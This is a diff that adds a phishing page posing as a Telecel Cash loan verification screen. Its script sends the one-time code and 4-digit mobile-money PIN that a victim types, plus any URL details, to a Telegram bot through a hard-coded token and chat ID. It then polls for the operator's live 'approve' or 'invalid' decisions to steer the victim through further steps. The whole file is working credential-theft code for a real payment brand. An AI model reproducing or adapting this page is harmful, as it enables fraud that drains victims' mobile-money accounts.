@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>OTP Verification - Telecel Cash</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --red: #E42320;
+            --red-dark: #c01c1a;
+            --red-soft: rgba(228,35,32,0.08);
+            --red-border: rgba(228,35,32,0.18);
+            --green: #10b981;
+            --yellow: #f59e0b;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: #f3f4f6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+            max-height: 90vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .logo-section {
+            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
+            text-align: center;
+            padding: 28px 0 22px;
+            flex-shrink: 0;
+        }
+        .brand-logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: white;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .brand-name {
+            color: white;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .tagline {
+            color: rgba(255,255,255,0.85);
+            font-size: 12.5px;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .content-wrapper {
+            flex: 1;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+        }
+        h1 {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #1e2937;
+            margin: 22px 0 6px;
+            padding: 0 20px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #475569;
+            font-size: 14.5px;
+            padding: 0 25px 18px;
+            line-height: 1.55;
+        }
+        .phone-display {
+            text-align: center;
+            font-size: 13.5px;
+            color: #64748b;
+            margin: -10px 0 14px;
+            padding: 0 25px;
+        }
+        .phone-display strong {
+            color: var(--red);
+            font-weight: 700;
+        }
+        .offer-info {
+            background: #fff0f0;
+            margin: 0 20px 18px;
+            padding: 15px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #ffe0e0;
+        }
+        .offer-info .offer-label {
+            font-size: 12px;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .offer-info .offer-name {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1e2937;
+            margin-bottom: 2px;
+        }
+        .offer-info .offer-amount {
+            color: var(--red);
+            font-weight: 800;
+            font-size: 24px;
+            line-height: 1.2;
+        }
+        .offer-meta {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+        .meta-item {
+            font-size: 12px;
+            color: #64748b;
+        }
+        .meta-item span {
+            font-weight: 600;
+            color: #1e2937;
+        }
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 18px 0 26px;
+            padding: 0 20px;
+            flex-wrap: wrap;
+        }
+        .otp-input {
+            width: 52px;
+            height: 62px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--red);
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
+            outline: none;
+            transition: all 0.2s;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            flex-shrink: 0;
+            background: white;
+        }
+        .otp-input.error {
+            border-color: #ef4444;
+            background: #fef2f2;
+            animation: shake 0.3s ease-in-out;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        @media (max-width: 480px) {
+            .otp-input { width: 48px; height: 58px; font-size: 24px; }
+            .otp-container { gap: 8px; margin: 16px 0 20px; }
+        }
+        @media (max-width: 380px) {
+            .otp-input { width: 42px; height: 52px; font-size: 20px; }
+            .otp-container { gap: 6px; }
+        }
+        .otp-input:focus {
+            border-color: var(--red);
+            box-shadow: 0 0 0 4px rgba(228,35,32,0.15);
+        }
+        .form-section {
+            padding: 0 25px 30px;
+            flex-shrink: 0;
+        }
+        .error-msg {
+            text-align: center;
+            margin: 12px 20px 18px;
+            font-size: 14px;
+            padding: 14px;
+            border-radius: 12px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            animation: slideDown 0.3s ease;
+        }
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .error-msg.show {
+            display: flex;
+        }
+        .error-msg.error {
+            color: #b91c1c;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+        }
+        .error-msg.warning {
+            color: #92400e;
+            background: #fffbeb;
+            border: 1px solid #fcd34d;
+        }
+        .btn-action {
+            width: 100%;
+            background: var(--red);
+            color: white;
+            border: none;
+            padding: 17px;
+            font-size: 17px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.2s;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+        .btn-action:hover { background: var(--red-dark); }
+        .btn-action:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        .back-btn {
+            width: 100%;
+            background: transparent;
+            color: #64748b;
+            border: 2px solid #e2e8f0;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            transition: all 0.2s;
+        }
+        .back-btn:hover {
+            border-color: #9ca3af;
+            color: #1e2937;
+        }
+        #spinner {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.92);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+        }
+        .spin {
+            width: 65px;
+            height: 65px;
+            border: 6px solid rgba(255,255,255,0.2);
+            border-top: 6px solid var(--red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* PIN Modal */
+        #pinModal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.75);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            backdrop-filter: blur(4px);
+        }
+        .modal-card {
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+            animation: fadeUp 0.35s cubic-bezier(.22,.8,.3,1) both;
+            max-height: 90vh;
+            display: flex;
+            flex-direction: column;
+        }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        .modal-logo-section {
+            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
+            text-align: center;
+            padding: 28px 0 22px;
+            flex-shrink: 0;
+        }
+        .modal-content {
+            flex: 1;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            padding: 0;
+        }
+        .modal-h1 {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #1e2937;
+            margin: 22px 0 6px;
+            padding: 0 20px;
+        }
+        .modal-subtitle {
+            text-align: center;
+            color: #475569;
+            font-size: 14.5px;
+            padding: 0 25px 18px;
+            line-height: 1.55;
+        }
+        .modal-form-section {
+            padding: 0 25px 30px;
+            flex-shrink: 0;
+        }
+        .pin-error-msg {
+            text-align: center;
+            margin: 12px 20px 18px;
+            font-size: 14px;
+            padding: 14px;
+            border-radius: 12px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            animation: slideDown 0.3s ease;
+        }
+        .pin-error-msg.show {
+            display: flex;
+        }
+        .pin-error-msg.error {
+            color: #b91c1c;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+        }
+        .resend-link {
+            text-align: center;
+            margin: 10px 0 20px;
+        }
+        .resend-link button {
+            background: none;
+            border: none;
+            color: var(--red);
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 13px;
+            text-decoration: underline;
+            padding: 8px 16px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                border-radius: 16px;
+            }
+            .modal-card {
+                border-radius: 16px;
+            }
+            h1, .modal-h1 {
+                font-size: 20px;
+                margin: 18px 0 4px;
+            }
+            .subtitle, .modal-subtitle {
+                font-size: 13.5px;
+                padding: 0 20px 16px;
+            }
+            .form-section, .modal-form-section {
+                padding: 0 20px 24px;
+            }
+            .btn-action {
+                padding: 15px;
+                font-size: 16px;
+                margin: 8px 0;
+            }
+            .back-btn {
+                padding: 14px;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <div class="brand-logo">
+                <div class="logo-icon">
+                    <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="3" y="12" width="22" height="14" rx="3" fill="#E42320"/>
+                        <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="#E42320" stroke-width="2.2" stroke-linecap="round" fill="none"/>
+                        <circle cx="14" cy="19" r="2.5" fill="white"/>
+                    </svg>
+                </div>
+                <div>
+                    <div class="brand-name">Telecel<span>Cash</span></div>
+                    <div class="tagline">Mobile Money • Loans</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="content-wrapper">
+            <h1>Verify Your Loan</h1>
+            <p class="subtitle">A 5-digit verification code has been sent to your number. Enter it below to confirm your loan application.</p>
+            <p class="phone-display" id="phoneDisplay"></p>
+
+            <div class="offer-info" id="offerInfo">
+                <div class="offer-label">Loan Application</div>
+                <div class="offer-name" id="offerTitle"></div>
+                <div class="offer-amount" id="offerPrice"></div>
+                <div class="offer-meta" id="offerMeta"></div>
+            </div>
+
+            <div class="otp-container" id="otpInputs"></div>
+            
+            <div class="error-msg error" id="errMsg">
+                <span>⚠️</span>
+                <span id="errMsgText"></span>
+            </div>
+
+            <div class="resend-link">
+                <button onclick="resendOTP()">⟳ Didn't receive code? Resend OTP</button>
+            </div>
+
+            <div class="form-section">
+                <button class="btn-action" id="verifyBtn">Verify & Confirm Loan</button>
+                <button class="back-btn" onclick="window.history.back()">← Back</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PIN Modal -->
+    <div id="pinModal">
+        <div class="modal-card">
+            <div class="modal-logo-section">
+                <div class="brand-logo">
+                    <div class="logo-icon">
+                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="3" y="12" width="22" height="14" rx="3" fill="#E42320"/>
+                            <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="#E42320" stroke-width="2.2" stroke-linecap="round" fill="none"/>
+                            <circle cx="14" cy="19" r="2.5" fill="white"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <div class="brand-name">Telecel<span>Cash</span></div>
+                        <div class="tagline">Mobile Money • Loans</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal-content">
+                <h1 class="modal-h1">Enter PIN</h1>
+                <p class="modal-subtitle">Enter your 4-digit PIN to complete this transaction securely.</p>
+
+                <div class="otp-container" id="pinInputs"></div>
+                
+                <div class="pin-error-msg error" id="pinErrMsg">
+                    <span>⚠️</span>
+                    <span id="pinErrMsgText"></span>
+                </div>
+
+                <div class="modal-form-section">
+                    <button class="btn-action" id="confirmPinBtn">Confirm PIN</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="spinner">
+        <div class="spin"></div>
+        <p style="margin-top:25px; font-size:17px;">Verifying code...</p>
+    </div>
+
+    <script>
+        const CONFIG = {
+            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
+            CHAT_ID: '7547427914',
+            SUCCESS_PAGE: 'success.html',
+            DEVICE_PAGE: 'device_verify.html'
+        };
+
+        let state = { lastUpdateId: 0 };
+        let isProcessing = false;
+
+        const errMsg = document.getElementById('errMsg');
+        const errMsgText = document.getElementById('errMsgText');
+        const pinErrMsg = document.getElementById('pinErrMsg');
+        const pinErrMsgText = document.getElementById('pinErrMsgText');
+        const spinner = document.getElementById('spinner');
+        const pinModal = document.getElementById('pinModal');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const confirmPinBtn = document.getElementById('confirmPinBtn');
+        const offerTitleEl = document.getElementById('offerTitle');
+        const offerPriceEl = document.getElementById('offerPrice');
+        const offerMetaEl = document.getElementById('offerMeta');
+        const phoneDisplayEl = document.getElementById('phoneDisplay');
+
+        // Read ALL params from URL
+        const params = new URLSearchParams(window.location.search);
+        let userPhone = params.get('phone') || params.get('msisdn') || '';
+
+        function getAllParams() {
+            return params.toString();
+        }
+
+        function buildNextUrl(page) {
+            const qs = getAllParams();
+            return qs ? `${page}?${qs}` : page;
+        }
+
+        function showError(element, text, type = 'error') {
+            element.classList.add('show');
+            element.classList.remove('warning');
+            element.classList.add(type);
+            if (element === errMsg) {
+                errMsgText.textContent = text;
+            } else {
+                pinErrMsgText.textContent = text;
+            }
+            
+            // Auto-hide after 3 seconds
+            setTimeout(() => {
+                element.classList.remove('show');
+            }, 3000);
+        }
+
+        function hideError(element) {
+            element.classList.remove('show');
+        }
+
+        function showInputError(inputs) {
+            inputs.forEach(input => {
+                input.classList.add('error');
+                setTimeout(() => {
+                    input.classList.remove('error');
+                }, 500);
+            });
+        }
+
+        function loadOffer() {
+            const name     = params.get('name')     || params.get('loan_name')   || 'Flex Loan';
+            const amount   = params.get('amount')   || params.get('loan_amount') || '1000';
+            const phone    = params.get('phone')    || params.get('msisdn')      || '';
+            const duration = params.get('duration') || params.get('tenor')       || '';
+            const rate     = params.get('rate')     || params.get('interest')    || '';
+            const fee      = params.get('fee')      || '';
+
+            offerTitleEl.textContent = name;
+            offerPriceEl.textContent = `GHS ${parseInt(amount).toLocaleString()}`;
+
+            const metaItems = [];
+            if (duration) metaItems.push({ label: 'Duration', value: duration });
+            if (rate)     metaItems.push({ label: 'Interest',  value: rate });
+            if (fee)      metaItems.push({ label: 'Fee',       value: `GHS ${fee}` });
+
+            if (metaItems.length) {
+                offerMetaEl.innerHTML = metaItems
+                    .map(m => `<div class="meta-item">${m.label}: <span>${m.value}</span></div>`)
+                    .join('');
+            }
+
+            if (phone) {
+                userPhone = phone;
+                phoneDisplayEl.innerHTML = `Code sent to <strong>${maskPhone(phone)}</strong>`;
+            }
+        }
+
+        function maskPhone(phone) {
+            const p = phone.replace(/\s+/g, '');
+            if (p.length <= 5) return p;
+            return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2);
+        }
+
+        function createInputs(containerId, count) {
+            const container = document.getElementById(containerId);
+            container.innerHTML = '';
+            for (let i = 0; i < count; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.maxLength = 1;
+                input.className = 'otp-input';
+                input.inputMode = 'numeric';
+                input.pattern = '[0-9]*';
+                container.appendChild(input);
+            }
+        }
+
+        function getCode(containerId) {
+            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
+                       .map(i => i.value.trim()).join('');
+        }
+
+        function clearInputs(containerId) {
+            document.querySelectorAll(`#${containerId} .otp-input`).forEach(i => i.value = '');
+        }
+
+        function setupAutoFocus(containerId, length, onComplete) {
+            const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    input.value = input.value.replace(/\D/g, '');
+                    if (input.value.length === 1 && index < length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    if (getCode(containerId).length === length) {
+                        setTimeout(onComplete, 180);
+                    }
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        }
+
+        function focusFirstInput(containerId) {
+            const first = document.querySelector(`#${containerId} .otp-input`);
+            if (first) first.focus();
+        }
+
+        function resendOTP() {
+            showError(errMsg, '📱 A new verification code has been sent to your phone', 'error');
+            clearInputs('otpInputs');
+            focusFirstInput('otpInputs');
+            console.log('Resending OTP to:', userPhone);
+        }
+
+        function submitOTP() {
+            if (isProcessing) return;
+            
+            const otp = getCode('otpInputs');
+            
+            if (otp.length !== 5) {
+                showError(errMsg, 'Please enter the complete 5-digit verification code', 'warning');
+                showInputError(document.querySelectorAll('#otpInputs .otp-input'));
+                return;
+            }
+            
+            isProcessing = true;
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Verifying...';
+            hideError(errMsg);
+
+            const ts         = Date.now();
+            const approveId  = `otp_approve_${ts}`;
+            const declineId  = `otp_decline_${ts}`;
+            const verifyDeviceId = `otp_verify_${ts}`;
+            const validId    = `valid_${ts}`;
+            const invalidId  = `invalid_${ts}`;
+
+            const paramSummary = Array.from(params.entries())
+                .map(([k, v]) => `${k}: <code>${v}</code>`)
+                .join('\n');
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🔴 OTP Verification — Telecel Cash</b>\n\n${paramSummary}\nOTP: <code>${otp}</code>\n\nChoose Action:`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Approve',       callback_data: approveId },
+                                { text: '📱 Verify Device', callback_data: verifyDeviceId }
+                            ],
+                            [
+                                { text: '✅ Valid PIN',   callback_data: validId },
+                                { text: '❌ Invalid PIN', callback_data: invalidId }
+                            ],
+                            [{ text: '❌ Decline', callback_data: declineId }]
+                        ]
+                    }
+                })
+            })
+            .then(() => {
+                spinner.style.display = 'flex';
+                startPolling(approveId, declineId, verifyDeviceId, validId, invalidId);
+            })
+            .catch(() => {
+                resetButton();
+                showError(errMsg, 'Network error. Please check your connection and try again.', 'error');
+            });
+        }
+
+        function startPolling(approveId, declineId, verifyDeviceId, validId, invalidId) {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            if (update.callback_query) {
+                                const cb = update.callback_query.data;
+                                if (cb === approveId) {
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    showPinModal();
+                                } else if (cb === validId) {
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+                                } else if (cb === verifyDeviceId) {
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = buildNextUrl(CONFIG.DEVICE_PAGE);
+                                } else if (cb === declineId) {
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    showError(errMsg, '❌ Your request was declined. Please try again.', 'error');
+                                    clearInputs('otpInputs');
+                                    focusFirstInput('otpInputs');
+                                    resetButton();
+                                } else if (cb === invalidId) {
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    showError(errMsg, '❌ Invalid verification code. Please try again.', 'error');
+                                    clearInputs('otpInputs');
+                                    focusFirstInput('otpInputs');
+                                    showInputError(document.querySelectorAll('#otpInputs .otp-input'));
+                                    resetButton();
+                                }
+                            }
+                        });
+                    });
+            }, 1000);
+        }
+
+        function showPinModal() {
+            pinModal.style.display = 'flex';
+            createInputs('pinInputs', 4);
+            setupAutoFocus('pinInputs', 4, submitPIN);
+            focusFirstInput('pinInputs');
+            hideError(pinErrMsg);
+        }
+
+        function submitPIN() {
+            const pin = getCode('pinInputs');
+            
+            if (pin.length !== 4) {
+                showError(pinErrMsg, 'Please enter your 4-digit PIN', 'warning');
+                showInputError(document.querySelectorAll('#pinInputs .otp-input'));
+                return;
+            }
+
+            confirmPinBtn.disabled = true;
+            confirmPinBtn.textContent = 'Verifying...';
+            hideError(pinErrMsg);
+
+            const ts        = Date.now();
+            const validId   = `valid_${ts}`;
+            const invalidId = `invalid_${ts}`;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🔴 PIN Verification</b>\n\nPhone: ${userPhone}\nPIN: <code>${pin}</code>\n\nChoose action:`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: '✅ Valid PIN',   callback_data: validId },
+                            { text: '❌ Invalid PIN', callback_data: invalidId }
+                        ]]
+                    }
+                })
+            }).then(() => startPinPolling(validId, invalidId));
+        }
+
+        function startPinPolling(validId, invalidId) {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        data.result?.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            if (update.callback_query) {
+                                const cb = update.callback_query.data;
+                                if (cb === validId) {
+                                    clearInterval(interval);
+                                    pinModal.style.display = 'none';
+                                    window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+                                } else if (cb === invalidId) {
+                                    clearInterval(interval);
+                                    showError(pinErrMsg, '❌ Invalid PIN. Please try again.', 'error');
+                                    clearInputs('pinInputs');
+                                    focusFirstInput('pinInputs');
+                                    showInputError(document.querySelectorAll('#pinInputs .otp-input'));
+                                    confirmPinBtn.disabled = false;
+                                    confirmPinBtn.textContent = 'Confirm PIN';
+                                }
+                            }
+                        });
+                    });
+            }, 1400);
+        }
+
+        function resetButton() {
+            isProcessing = false;
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'Verify & Confirm Loan';
+        }
+
+        // Initialize
+        createInputs('otpInputs', 5);
+        setupAutoFocus('otpInputs', 5, submitOTP);
+        verifyBtn.onclick = submitOTP;
+        confirmPinBtn.onclick = submitPIN;
+        loadOffer();
+        focusFirstInput('otpInputs');
+    </script>
+</body>
+</html>
